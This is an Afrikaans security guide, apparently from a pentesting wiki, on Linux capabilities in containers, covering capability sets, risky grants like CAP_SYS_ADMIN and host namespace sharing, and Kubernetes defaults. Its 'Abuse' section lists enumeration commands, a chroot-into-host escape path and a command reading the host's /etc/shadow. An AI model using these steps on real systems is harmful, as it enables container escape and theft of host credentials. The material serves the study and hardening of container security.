...
Linux capabilities is een van die belangrikste dele van container security omdat dit 'n subtiele maar fundamentele vraag beantwoord: **wat beteken "root" werklik binne 'n container?** Op 'n normale Linux-stelsel het UID 0 histories 'n baie breë stel privileges geïmpliseer. In moderne kernels word daardie privilege opgebreek in kleiner eenhede genaamd capabilities. 'n Proses kan as root loop en steeds baie kragtige bewerkings ontbreek indien die relevante capabilities verwyder is.

Containers maak sterk staat op hierdie onderskeid. Baie workloads word steeds as UID 0 binne die container geloods vir versoenbaarheids- of eenvoudigheidsredes. Sonder capability dropping sou dit heeltemal te gevaarlik wees. Met capability dropping kan 'n containerized root-proses steeds baie gewone take binne die container uitvoer, terwyl dit toegang tot meer sensitiewe kernel-bewerkings geweier word. Daarom beteken 'n container shell wat `uid=0(root)` wys, nie outomaties "host root" of selfs "breë kernel privilege" nie. Die capability sets bepaal hoeveel daardie root-identiteit werklik werd is.
...
Capabilities word in verskeie sets nagespoor, insluitend permitted, effective, inheritable, ambient en bounding sets. Vir baie container-assessments is die presiese kernel-semantiek van elke set minder onmiddellik belangrik as die finale praktiese vraag: **watter bevoorregte bewerkings kan hierdie proses tans suksesvol uitvoer, en watter toekomstige privilege gains is nog moontlik?**

Die rede waarom dit belangrik is, is dat baie breakout-tegnieke eintlik capability-probleme is wat as container-probleme vermom word. 'n Workload met `CAP_SYS_ADMIN` kan toegang verkry tot 'n enorme hoeveelheid kernel-funksionaliteit waaraan 'n normale container root-proses nie behoort te raak nie. 'n Workload met `CAP_NET_ADMIN` word baie gevaarliker indien dit ook die host network namespace deel. 'n Workload met `CAP_SYS_PTRACE` word baie interessanter indien dit host-prosesse deur host PID sharing kan sien. In Docker of Podman kan dit as `--pid=host` verskyn; in Kubernetes verskyn dit gewoonlik as `hostPID: true`.
...
capsh --print
```
Jy kan ook ’n meer beperkende container vergelyk met een waaraan al die capabilities bygevoeg is:
```bash
...
**`CAP_SYS_ADMIN`** is die een wat defenders met die meeste agterdog moet hanteer. Dit word dikwels "the new root" genoem omdat dit ’n enorme hoeveelheid funksionaliteit ontsluit, insluitend mount-verwante operasies, namespace-sensitiewe gedrag en baie kernel-paaie wat nooit sorgeloos aan containers blootgestel behoort te word nie. As ’n container `CAP_SYS_ADMIN`, swak seccomp en geen sterk MAC confinement het nie, word baie klassieke breakout-paaie baie meer realisties.
...
Die mees ooglopende fout is **`--cap-add=ALL`** in Docker/Podman-style CLIs, maar dit is nie die enigste een nie. In die praktyk is ’n meer algemene probleem die toekenning van een of twee uiters kragtige capabilities, veral `CAP_SYS_ADMIN`, om "the application work" te laat sonder om ook die namespace-, seccomp- en mount-implikasies te verstaan. ’n Ander algemene failure mode is die kombinasie van ekstra capabilities met host namespace sharing. In Docker of Podman kan dit as `--pid=host`, `--network=host` of `--userns=host` verskyn; in Kubernetes verskyn die ekwivalente exposure gewoonlik deur workload-settings soos `hostPID: true` of `hostNetwork: true`. Elk van hierdie kombinasies verander wat die capability werklik kan beïnvloed.

Dit is ook algemeen dat administrators glo dat ’n workload, omdat dit nie volledig `--privileged` is nie, steeds betekenisvol beperk is. Soms is dit waar, maar soms is die effective posture reeds na genoeg aan privileged dat die onderskeid operasioneel ophou saak maak.

## Abuse

Die eerste praktiese stap is om die effective capability set te enumerateer en onmiddellik die capability-specific actions te toets wat vir escape of host information access relevant sou wees:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
As `CAP_SYS_ADMIN` teenwoordig is, toets mount-gebaseerde misbruik en toegang tot die host-lêerstelsel eerste, want dit is een van die algemeenste ontsnappingsfasiliteerders:
```bash
mkdir -p /tmp/m
...
```
Indien `CAP_SYS_PTRACE` teenwoordig is en die houer interessante prosesse kan sien, verifieer of die capability in prosesinspeksie omskep kan word:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Indien `CAP_NET_ADMIN` of `CAP_NET_RAW` teenwoordig is, toets of die werklas die sigbare netwerkstack kan manipuleer of ten minste nuttige netwerkinligting kan insamel:
```bash
...
As die container `CAP_SYS_ADMIN` en ’n skryfbare bind mount van die host-lêerstelsel, soos `/host`, het, is die ontsnappingspad dikwels eenvoudig:
```bash
...
```
As `chroot` suksesvol is, word opdragte nou in die konteks van die host se root-lêerstelsel uitgevoer:
```bash
id
hostname
cat /etc/shadow | head
...
```
### Volledige voorbeeld: `CAP_NET_ADMIN` + Host-netwerk

Hierdie kombinasie lei nie altyd direk tot root op die host nie, maar dit kan die host se netwerkstack volledig herkonfigureer:
```bash
...
| Kubernetes | Erfenis van runtime-verstekwaardes tensy dit verander word | Indien geen `securityContext.capabilities` gespesifiseer word nie, kry die container die verstek-capability-stel van die runtime | `securityContext.capabilities.add`, versuim om `drop: [\"ALL\"]` te gebruik, `privileged: true` |
| containerd / CRI-O onder Kubernetes | Gewoonlik runtime-verstekwaarde | Die effektiewe stel hang van die runtime plus die Pod-specifikasie af | dieselfde as die Kubernetes-ry; direkte OCI/CRI-konfigurasie kan ook capabilities uitdruklik byvoeg |
